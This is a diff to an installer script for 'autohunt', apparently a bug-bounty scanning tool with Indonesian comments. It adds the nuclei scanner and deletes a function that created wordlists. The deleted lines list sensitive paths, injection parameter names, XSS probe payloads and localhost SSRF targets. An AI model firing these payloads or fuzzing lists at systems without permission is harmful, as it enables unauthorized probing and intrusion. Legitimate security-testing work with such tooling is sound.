@@ -10,7 +10,8 @@
 #     - subfinder
 #     - httpx
 #     - ffuf
-# - Copy binary ke /usr/bin (atau /data/data/com.termux/files/usr/bin untuk Termux)
+#     - nuclei
+# - Copy binary ke /usr/bin (atau /data/data/com.termux/files/usr/bin untuk Termux), overwrite jika sudah ada
 #
 # Catatan:
 # - Wajib dijalankan dengan hak yang cukup untuk menulis ke direktori bin sistem:
@@ -223,141 +224,15 @@ install_external_tools() {
   # ffuf - directory/file fuzzing (digunakan untuk brute path sensitif, jika diintegrasikan)
   install_go_tool "github.com/ffuf/ffuf" "ffuf" || true
 
+  # nuclei - template-based vulnerability scanner
+  install_go_tool "github.com/projectdiscovery/nuclei/v3/cmd/nuclei" "nuclei" || true
+
   log_info "Selesai mencoba install tools eksternal."
-  log_info "autohunt akan otomatis memakai tools yang tersedia di PATH (gau, waybackurls, subfinder, httpx, ffuf) sesuai integrasi yang ada."
+  log_info "autohunt akan otomatis memakai tools yang tersedia di PATH (gau, waybackurls, subfinder, httpx, ffuf, nuclei) sesuai integrasi yang ada."
 }
 
 install_wordlists_and_payloads() {
-  log_info "Mengatur direktori wordlists & payloads untuk autohunt..."
-
-  AUTOWL_DIR="$PROJECT_ROOT/wordlists"
-  mkdir -p "$AUTOWL_DIR"
-
-  # 1. Wordlist direktori & file sensitif (subset terkurasi dari SecLists)
-  # Sumber referensi:
-  # - https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
-  # - https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/common.txt
-  # Di sini kita buat subset bawaan yang ringan namun efektif.
-  SENSITIVE_WORDLIST="$AUTOWL_DIR/dirs_common.txt"
-  if [ ! -f "$SENSITIVE_WORDLIST" ]; then
-    cat > "$SENSITIVE_WORDLIST" << 'EOF'
-/
-admin
-admin/
-admin/login
-adminpanel
-administrator
-api
-api/
-backup
-backup/
-backups
-config
-config.php
-config.bak
-database.sql
-db.sql
-debug
-dev
-env
-login
-login.php
-old
-old/
-panel
-phpinfo.php
-robots.txt
-server-status
-shell.php
-staging
-test
-test/
-uploads
-uploads/
-EOF
-    log_ok "Wordlist direktori/file sensitif dibuat: $SENSITIVE_WORDLIST"
-  else
-    log_info "Wordlist $SENSITIVE_WORDLIST sudah ada, skip."
-  fi
-
-  # 2. Wordlist endpoint parameter umum (untuk modul XSS/SQLi/LFI, subset)
-  PARAM_WORDLIST="$AUTOWL_DIR/params_common.txt"
-  if [ ! -f "$PARAM_WORDLIST" ]; then
-    cat > "$PARAM_WORDLIST" << 'EOF'
-id
-ids
-uid
-user
-userid
-username
-page
-p
-q
-s
-search
-query
-cat
-category
-ref
-url
-next
-redir
-redirect
-return
-dest
-file
-path
-include
-view
-template
-EOF
-    log_ok "Wordlist parameter umum dibuat: $PARAM_WORDLIST"
-  else
-    log_info "Wordlist $PARAM_WORDLIST sudah ada, skip."
-  fi
-
-  # 3. Payload XSS terkurasi (berdasarkan ide dari SecLists/Fuzzing/XSS but subset)
-  XSS_PAYLOADS="$AUTOWL_DIR/xss_payloads.txt"
-  if [ ! -f "$XSS_PAYLOADS" ]; then
-    cat > "$XSS_PAYLOADS" << 'EOF'
-"><svg/onload=alert(1)>
-"><img src=x onerror=alert(1)>
-"><script>alert(1)</script>
-"><script>confirm(1)</script>
-"><script>prompt(1)</script>
-"><body onload=alert(1)>
-"><iframe src=javascript:alert(1)>
-"><svg><script>alert(1)</script>
-"><img src=x: onerror=alert(1)>
-"><details open ontoggle=alert(1)>
-" autofocus onfocus=alert(1) x="
-'"><svg/onload=alert(1)>
-'"><img src=x onerror=alert(1)>
-'"><script>alert(1)</script>
-</script><script>alert(1)</script>
-"><svg/onload=alert(document.domain)>
-"><img src=x onerror=alert(document.domain)>
-EOF
-    log_ok "Payload XSS terkurasi dibuat: $XSS_PAYLOADS"
-  else
-    log_info "Payload XSS $XSS_PAYLOADS sudah ada, skip."
-  fi
-
-  # 4. Wordlist kecil untuk SSRF/Redirect (target aman)
-  SSRF_WORDLIST="$AUTOWL_DIR/ssrf_targets.txt"
-  if [ ! -f "$SSRF_WORDLIST" ]; then
-    cat > "$SSRF_WORDLIST" << 'EOF'
-http://127.0.0.1/
-http://localhost/
-http://0.0.0.0/
-EOF
-    log_ok "Wordlist SSRF kecil dibuat: $SSRF_WORDLIST"
-  else
-    log_info "Wordlist $SSRF_WORDLIST sudah ada, skip."
-  fi
-
-  log_ok "Wordlists & XSS payloads siap. Modul autohunt dapat disinkronkan membaca dari direktori: $AUTOWL_DIR"
-  log_info "Pastikan versi autohunt terbaru menggunakan path wordlists ini untuk fuzzing terarah."
+  log_info "Lewati pembuatan atau download wordlists/payloads; autohunt menggunakan wordlists yang ada di repository."
 }
 
 main() {
